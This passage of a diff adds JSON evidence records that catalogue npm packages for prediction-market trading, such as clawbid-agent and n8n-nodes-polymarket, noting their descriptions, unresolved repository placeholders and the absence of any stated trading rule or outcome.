+    "precondition": "generated artifact with an unsubstituted repository template",
+    "quote": "git+https://github.com/GIT_USER_ID/GIT_REPO_ID.git",
+    "location": "npm registry links.repository — the OpenAPI generator's placeholder was published unsubstituted, so the declared source repository does not resolve"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. The published metadata carries an unsubstituted generator placeholder in place of a source repository, which is a stated observable about how the record was produced.",
+   "expertise": "Not determinable; the declared repository link does not resolve to a producer. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "npm",
+  "_key": "clawbid-agent",
+  "id": "ks-sc-041",
+  "F2_source_class": "S-C",
+  "F2_identifier": "registry.npmjs.org/clawbid-agent 1.0.10",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T7",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T7",
+    "quote": "ClawBid AI Agent SDK — autonomous prediction market trading",
+    "location": "npm registry search result, package.description for clawbid-agent 1.0.10"
+   }
+  ],
+  "F5_evidence_location": "npm registry REST /-/v1/search, objects[].package.description",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "not stated — the description names no venue",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated in the package-index fields",
+    "quote": null,
+    "location": "package.description states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "'Autonomous prediction market trading' is asserted with no rule, no citation, and no derivation at the depth retrieved. Gap recorded; the corpus may never restate it as established.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "everything: the record states a capability and no rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. No source repository declared in the registry metadata.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "npm",
+  "_key": "n8n-nodes-polymarket",
+  "id": "ks-sc-042",
+  "F2_source_class": "S-C",
+  "F2_identifier": "registry.npmjs.org/n8n-nodes-polymarket 4.2.0",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "n8n community nodes for Polymarket - trading, market data, and order management",
+    "location": "npm registry search result, package.description for n8n-nodes-polymarket 4.2.0"
+   }
+  ],
+  "F5_evidence_location": "npm registry REST /-/v1/search, objects[].package.description",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Polymarket",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "requires a third-party workflow-automation host",
+    "quote": "n8n community nodes",
+    "location": "package.description"
+   },
+   {
+    "precondition": "unsubstituted repository template",
+    "quote": "git+https://github.com/yourusername/n8n-nodes-polymarket.git",
+    "location": "npm registry links.repository — the placeholder was published unsubstituted, so the declared source repository does not resolve"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. The published metadata carries an unsubstituted template placeholder in place of a source repository.",
+   "expertise": "Not determinable; the declared repository link does not resolve. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "npm",
+  "_key": "@alpha-arcade/sdk",
+  "id": "ks-sc-043",
+  "F2_source_class": "S-C",
+  "F2_identifier": "registry.npmjs.org/@alpha-arcade/sdk 0.5.0",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "TypeScript SDK for trading on Alpha Market — Algorand prediction markets. Place ",
+    "location": "npm registry search result, package.description for @alpha-arcade/sdk 0.5.0, as returned (the retrieved description is truncated at this length)"
+   }
+  ],
+  "F5_evidence_location": "npm registry REST /-/v1/search, objects[].package.description",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Alpha Market, stated as Algorand-based prediction markets",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "chain-specific settlement environment",
+    "quote": "Algorand prediction markets",
+    "location": "package.description"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {
+   "note": "Records a venue not named anywhere in the frozen query grid, reached only because the npm search matched on the generic event-contract term. Evidence that the arm's venue coverage is wider than its query tokens."
+  },
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. A source repository link is declared.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ }
+]
